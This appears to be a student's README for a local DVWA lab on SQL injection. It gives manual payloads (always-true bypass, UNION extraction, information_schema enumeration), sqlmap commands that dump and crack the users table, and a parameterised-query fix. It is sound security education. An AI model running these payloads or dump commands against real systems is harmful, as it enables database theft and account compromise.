# SQL Injection Attack & Analysis — DVWA

A hands-on web application penetration testing project demonstrating SQL injection vulnerabilities using DVWA (Damn Vulnerable Web Application), manual exploitation techniques, and automated scanning with SQLmap.

---

## Lab Environment

| Component | Details |
|-----------|---------|
| Attacker machine | Kali Linux (VirtualBox) |
| Target | DVWA running on Apache/MariaDB (localhost) |
| Tools used | Browser, SQLmap 1.10.4 |
| Security level | Low (intentional — for learning) |

> All activity performed in an isolated local lab environment. No real systems involved.

---

## What is SQL Injection?

SQL injection occurs when user-supplied input is inserted directly into a database query without sanitisation. An attacker can break out of the intended query and execute their own SQL commands — extracting data, bypassing authentication, or destroying databases.

**Normal query the website runs:**
```sql
SELECT * FROM users WHERE id='1'
```

**After injection:**
```sql
SELECT * FROM users WHERE id='1' OR '1'='1'
```
`'1'='1'` is always true — returns every row in the table.

---

## Attack Methodology

```
Step 1 → Identify injectable parameter
Step 2 → Manual exploitation (bypass + UNION attacks)
Step 3 → Database enumeration (information_schema)
Step 4 → Automated exploitation + hash cracking (SQLmap)
```

---

## Attack 1 — Basic Filter Bypass

**Target:** `http://localhost/DVWA/vulnerabilities/sqli/`

**Payload:**
```
1' OR '1'='1
```

**What happened:** The WHERE clause became always-true, returning all users from the database with zero credentials.

**Screenshot:** `screenshots/attack1_bypass.png`

---

## Attack 2 — UNION-Based Data Extraction

**Payload:**
```
1' UNION SELECT user, password FROM users-- -
```

**What happened:** Extracted all usernames and MD5 password hashes directly from the users table.

**Screenshot:** `screenshots/attack2_union.png`

---

## Attack 3 — Database Structure Enumeration

**Payload — list all tables:**
```
1' UNION SELECT table_name, NULL FROM information_schema.tables-- -
```

**Payload — list columns in users table:**
```
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
```

**What happened:** Mapped the entire database structure without any credentials.

**Screenshot:** `screenshots/attack3_enum.png`

---

## Attack 4 — Automated Exploitation with SQLmap

**Command — enumerate databases:**
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<your_session>; security=low" --dbs --batch --level=2
```

**Command — dump users table:**
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<your_session>; security=low" -D dvwa -T users --dump --batch
```

**Databases found:**
```
[*] dvwa
[*] information_schema
```

**Screenshot:** `screenshots/attack4_sqlmap.png`

---

## Findings — Extracted User Database

| Username | Password Hash | Cracked Password |
|----------|--------------|-----------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

SQLmap automatically cracked all MD5 hashes during the dump.

**Raw output:** `users.csv`

---

## Real-World Impact

In a real application this attack would mean:

- Every user account fully compromised
- Plaintext passwords recovered — usable on other sites (password reuse)
- Full database access — customer data, payment info, internal records all exposed
- Potential for further attacks — file read/write, OS command execution via advanced SQLi

---

## How to Fix SQL Injection

**Wrong (vulnerable):**
```php
$query = "SELECT * FROM users WHERE id='$id'";
```

**Right (parameterised query):**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

Parameterised queries separate SQL code from user data — injection becomes impossible because input is never interpreted as SQL.

**Additional defences:**
- Input validation and whitelisting
- Least privilege database accounts
- Web Application Firewall (WAF)
- Error message suppression in production

---

## Files in This Repo

| File | Description |
|------|-------------|
| `README.md` | Full project documentation |
| `users.csv` | Raw SQLmap database dump |
| `/screenshots` | Terminal and browser screenshots |

---

## What I Learned

- How SQL injection works at the query level — not just conceptually
- The difference between manual exploitation and automated tooling
- How MD5 hashed passwords can be cracked instantly using rainbow tables
- Why parameterised queries completely prevent this class of vulnerability
- Real-world impact of a single unvalidated input field

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLmap Documentation](https://sqlmap.org)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [CrackStation — Hash Cracking](https://crackstation.net)
